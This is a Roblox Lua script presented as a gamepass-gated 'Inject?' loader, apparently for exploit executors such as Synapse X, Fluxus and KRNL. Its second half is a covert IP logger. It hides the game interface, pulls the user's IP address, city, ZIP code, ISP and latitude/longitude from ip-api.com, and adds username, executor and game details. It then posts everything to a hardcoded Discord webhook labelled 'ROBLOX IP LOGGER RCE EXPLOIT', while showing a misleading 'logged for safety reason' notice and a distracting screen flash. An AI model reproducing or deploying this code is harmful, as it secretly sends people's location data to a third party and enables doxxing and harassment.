-- Services
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TweenService = game:GetService("TweenService")

-- Player
local player = Players.LocalPlayer

-- Configuration
local GAMEPASS_ID = 12345678 -- Replace with your Gamepass ID
local GAMEPASS_URL = "https://www.roblox.com/1596142188" -- Replace with your URL
local LOADER_TIME = 3 -- seconds to simulate loading

-- Whitelist by UserId
local WHITELISTED_USERIDS = {
    12345678,
    87654321,
    1596142188,
}
local function isWhitelisted(userId)
    for _, id in ipairs(WHITELISTED_USERIDS) do
        if id == userId then
            return true
        end
    end
    return false
end

-- UI Setup
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
frame.AnchorPoint = Vector2.new(0.5, 0.5)

-- Button
local button = Instance.new("TextButton")
button.Size = UDim2.new(0, 200, 0, 50)
button.Position = UDim2.new(0.5, -100, 0.7, 0)
button.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
button.Font = Enum.Font.Arcade
button.TextSize = 28
button.TextColor3 = Color3.new(1,1,1)
button.Text = "Inject?"
button.AnchorPoint = Vector2.new(0.5, 0.5)
button.Parent = frame

local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 12)
buttonCorner.Parent = button

-- Loading Label
local loading = Instance.new("TextLabel")
loading.Size = UDim2.new(1, -20, 0, 60)
loading.Position = UDim2.new(0, 10, 0, 10)
loading.BackgroundTransparency = 1
loading.Font = Enum.Font.Arcade
loading.TextColor3 = Color3.new(1,1,1)
loading.TextScaled = true
loading.TextWrapped = true
loading.TextXAlignment = Enum.TextXAlignment.Center
loading.TextYAlignment = Enum.TextYAlignment.Center
loading.Text = "Loading"
loading.Visible = false
loading.Parent = frame

-- Animated Loading
local function animateLoadingText(label)
    local states = {"Loading", "Loading.", "Loading..", "Loading..."}
    local index = 1
    while label.Visible do
        label.Text = states[index]
        index = index % #states + 1
        task.wait(0.3)
    end
end

-- Loader / Injector
local function startLoader()
    frame.Visible = false
    loading.Visible = true
    task.spawn(function() animateLoadingText(loading) end)
    task.wait(LOADER_TIME)
    loading.Visible = false
    print("Injected! Player is whitelisted or owns gamepass.")
    
    -- Inject / execute your code here
    -- Example placeholder:
    print(">> Injecting script now...")
    -- loadstring(game:HttpGet('YOUR_SCRIPT_URL', true))()
end

-- Gamepass check
local function ownsGamepass()
    local success, owns = pcall(function()
        return MarketplaceService:UserOwnsGamePassAsync(player.UserId, GAMEPASS_ID)
    end)
    return success and owns
end

-- Button click logic
button.MouseButton1Click:Connect(function()
    local allowed = false

    if isWhitelisted(player.UserId) then
        allowed = true
    elseif ownsGamepass() then
        allowed = true
    end

    if allowed then
        startLoader()
    else
        if setclipboard then setclipboard(GAMEPASS_URL) end
        button.Text = "Gamepass not owned: URL Copied"
        if RunService:IsStudio() then
            print("Studio cannot show purchase prompt. Test live game.")
        else
            MarketplaceService:PromptGamePassPurchase(player, GAMEPASS_ID)
        end
    end
end)


wait("3")

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local RunService = game:GetService("RunService")
local Marketplace = game:GetService("MarketplaceService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

local executor = "Unknown"
if identifyexecutor then executor = identifyexecutor() end
if syn then executor = "Synapse X" end
if fluxus then executor = "Fluxus" end
if KRNL then executor = "KRNL" end

local fps = 0
RunService.RenderStepped:Connect(function(dt)
    fps = math.floor(1 / dt)
end)

local ping = math.floor(game.Stats.Network.ServerStatsItem["Data Ping"]:GetValue())

local gameName = "Unknown"
pcall(function()
    gameName = Marketplace:GetProductInfo(game.PlaceId).Name
end)
local placeId = game.PlaceId

local timeStr = os.date("%Y-%m-%d %H:%M:%S")


local function notify(title, message)
    if syn and syn.toast_notification then
        syn.toast_notification(title, message)
    elseif fluxus and fluxus.toast_notification then
        fluxus.toast_notification(title, message)
    elseif KRNL and KRNL.Notify then
        KRNL.Notify(title, message)
    elseif rconsoleprint then
        rconsoleprint("\n["..title.."]\n" .. message .. "\n")
    else
        print(title .. ": " .. message)
    end
end

local ipInfo = {
    ip = "Unknown",
    city = "Unknown",
    region = "Unknown",
    country = "Unknown",
    timezone = "Unknown",
    zip = "Unknown",
    isp = "Unknown",
    lat = "Unknown",
    lon = "Unknown"
}

local success, body = pcall(function()
    local req = syn and syn.request or http_request or request
    if req then
        return req({
            Url = "http://ip-api.com/json",
            Method = "GET"
        }).Body
    end
end)

if success and body then
    local function grab(key)
        return body:match('"'..key..'":"(.-)"') or "Unknown"
    end
    ipInfo.ip      = grab("query")
    ipInfo.city     = grab("city")
    ipInfo.region   = grab("regionName")
    ipInfo.country  = grab("country")
    ipInfo.timezone = grab("timezone")
    ipInfo.zip      = grab("zip")
    ipInfo.isp      = grab("isp")
    ipInfo.lat      = grab("lat") or "Unknown"
    ipInfo.lon      = grab("lon") or "Unknown"
end


local fullInfo =
    "ip: " .. ipInfo.ip .. "\n" ..
    "City: " .. ipInfo.city .. "\n" ..
    "Region: " .. ipInfo.region .. "\n" ..
    "Country: " .. ipInfo.country .. "\n" ..
    "ZIP: " .. ipInfo.zip .. "\n" ..
    "Timezone: " .. ipInfo.timezone .. "\n" ..
    "ISP: " .. ipInfo.isp .. "\n" ..
    "Latitude: " .. ipInfo.lat .. "\n" ..
    "Longitude: " .. ipInfo.lon .. "\n" ..
    "\---GAME INFO---\n" ..
"Player: " .. player.Name .. "\n" ..
"Executor: " .. executor .. "\n" ..
"FPS: " .. fps .. "\n" ..
"Ping: " .. ping .. " ms\n" ..
"Game: " .. gameName .. " (" .. placeId .. ")\n" ..
"Date: " .. timeStr

notify("logged for safety reason", fullInfo)

local WEBHOOK = "https://discord.com/api/webhooks/1446628984053039276/BAaEKSqzI31hGlDnoYUuRV2EMAcyjXPTpuxVxUwA_FR7HmYEnyVEbcOrDNm-shogtz50" -- ðŸ”¥ PUT YOUR WEBHOOK HERE

pcall(function()
    local req = syn and syn.request or http_request or request
    if req then
        req({
            Url = WEBHOOK,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                content = "**ROBLOX IP LOGGER RCE EXPLOIT**\n```"..fullInfo.."```"
            })
        })
    end
end)

local gui = Instance.new("ScreenGui")
gui.Name = "rce exploit"
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(1,0,1,0)
frame.BackgroundColor3 = Color3.new(1,1,1)
frame.BackgroundTransparency = 1
frame.ZIndex = 9999
frame.Parent = gui

local tweenIn = TweenService:Create(frame, TweenInfo.new(0.15), {BackgroundTransparency = 0})
local tweenOut = TweenService:Create(frame, TweenInfo.new(0.25), {BackgroundTransparency = 1})

tweenIn:Play()
tweenIn.Completed:Wait()
wait(1)
tweenOut:Play()
tweenOut.Completed:Wait()

gui:Destroy()

StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
